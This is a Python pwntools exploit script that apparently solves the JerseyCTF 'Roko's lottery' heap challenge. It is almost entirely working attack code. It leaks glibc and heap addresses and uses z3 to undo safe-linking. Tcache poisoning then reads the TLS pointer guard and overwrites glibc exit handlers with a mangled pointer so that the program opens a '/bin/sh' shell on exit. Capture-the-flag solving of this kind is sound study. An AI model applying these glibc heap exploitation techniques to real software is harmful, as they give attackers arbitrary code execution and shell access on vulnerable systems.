from pwn import *
from z3 import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./lottery_patched', '''
    b *(main+403)
    b *(main+470)
    b *(main+700)
    b *(main+1040)
    b *(main+1090)
    b *(main+1466)
    continue
''')

# p = remote('rokos-lottery.aws.jerseyctf.com', 5000)

def attempt_ticket(size):
    p.sendlineafter(b"Enter your lucky number: ", b'1')
    p.sendlineafter(b"Enter your lucky number: ", str(size).encode())

def burn_used_tickets(number, signatures, signs):
    p.sendlineafter(b"Enter your lucky number: ", b'3')
    signatures_output = []
    for i in range(number):
        if signs[i]:
            p.sendlineafter(b"sign it before you discard? ", b'y')
            p.sendafter(b"Sign your ticket before it flies away: ", signatures[i])
            p.recvuntil(b"You sign ")
            signatures_output.append(p.recvuntil(b" as the ticket flies away...\n", drop=True))
        else:
            p.sendlineafter(b"sign it before you discard? ", b'n')
            signatures_output.append(b'NULL')
    return signatures_output

def scratch_ticket(name, jackpot=True, trip=False):
    p.sendlineafter(b"Enter your lucky number: ", b'5')
    if jackpot and not trip:
        p.recvuntil(b"Your earnings:\n")
        earnings = []
        for _ in range(5):
            earnings.append(p.recvline().strip()[1:])
        return earnings
    elif trip and not jackpot:
        p.sendafter(b"Please sign your name here: ", name)

def give_up():
    p.sendlineafter(b"Enter your lucky number: ", b'6')

def pointer_guard_encrypt(decrypted: int, pointer_guard: int):
    r_bits = 0x11
    max_bits = 64
    encrypted = ((decrypted^pointer_guard)<<(r_bits%max_bits))&(2**max_bits-1)|(((decrypted^pointer_guard)&(2**max_bits-1))>>(max_bits-(r_bits%max_bits)))
    return encrypted

# attempt_ticket: malloc a chunks with a specific size
# burn_used_tickets (based on whether to sign tickets): free all chunks in order from oldest malloced chunk to newest malloced chunk; if signature is chosen to be signed to a ticket, a string starting from address of chunk will leak
# scratch_ticket (based on results from PRNG): for first and second time calling this function, five values (-0x10, -8, 0, 8, 0x10) among address of newest malloced chunk can leak, which is called "jackpot"; for third and fourth time calling this function, 0x80 bytes from address of newest malloced chunk can be overwritten, which is called "trip"
# give_up: exit program

# Stage 1: get glibc base address, calculate tls base address, and set up provided seed for RNG
p.recvuntil(b"Here is last week's winning lottery number: ")
glibc_base_addr = int(p.recvline().strip().decode())-0x8cb30
log.info(f"glibc base address: {hex(glibc_base_addr)}")
tls_base_addr = glibc_base_addr-0x28c0
log.info(f"tls base address: {hex(tls_base_addr)}")
p.sendlineafter(b"Enter your lucky number: ", str(647389).encode())

# Stage 2: leak heap base address using z3-solver
attempt_ticket(0x18)
attempt_ticket(0x18)
heap_leaks = burn_used_tickets(2, [b'A', b'A'], signs=[True, True])
heap_base = BitVec('heap_base', 64)
s = Solver()
s.add((heap_base+0x2c0>>12)>>8==u64(heap_leaks[0].ljust(8, b'\x00'))>>8)
s.add(((heap_base+0x2e0>>12)^(heap_base+0x2c0))>>8==u64(heap_leaks[1].ljust(8, b'\x00'))>>8)
s.check()
heap_base_addr = s.model()[heap_base].as_long()
log.info(f"heap base address: {hex(heap_base_addr)}")

# Stage 3: leak pointer guard value using tcache poisoning
# tcache poisoning
attempt_ticket(0x28)
attempt_ticket(0x28)
glibc_e = ELF('./libc.so.6')
burn_used_tickets(2, [p64(((heap_base_addr+0x300)>>12)^0), p64(((heap_base_addr+0x330)>>12)^(tls_base_addr+0x30))], signs=[True, True])
attempt_ticket(0x28)
attempt_ticket(0x28)
pointer_guard_val = int(scratch_ticket(b'', jackpot=True, trip=False)[2])
log.info(f"pointer guard value: {hex(pointer_guard_val)}")

# Stage 4: abuse exit handlers and bypass pointer mangle using tcache poisoning
# move forward RNG
attempt_ticket(0x38)
attempt_ticket(0x38)
scratch_ticket(b'', jackpot=True, trip=False)
burn_used_tickets(2, [], signs=[False, False])
# tcache poisoning
attempt_ticket(0x48)
attempt_ticket(0x48)
burn_used_tickets(2, [p64(((heap_base_addr+0x3e0)>>12)^0), p64(((heap_base_addr+0x430)>>12)^(glibc_base_addr+0x212fd0))], signs=[True, True])
attempt_ticket(0x48)
attempt_ticket(0x48)
scratch_ticket(p64(0x4)+p64(pointer_guard_encrypt(glibc_base_addr+glibc_e.sym.system, pointer_guard_val))+p64(glibc_base_addr+next(glibc_e.search(b'/bin/sh\x00'))), jackpot=False, trip=True)
# trigger system("/bin/sh\x00")
give_up()

p.interactive()

# jctfv{}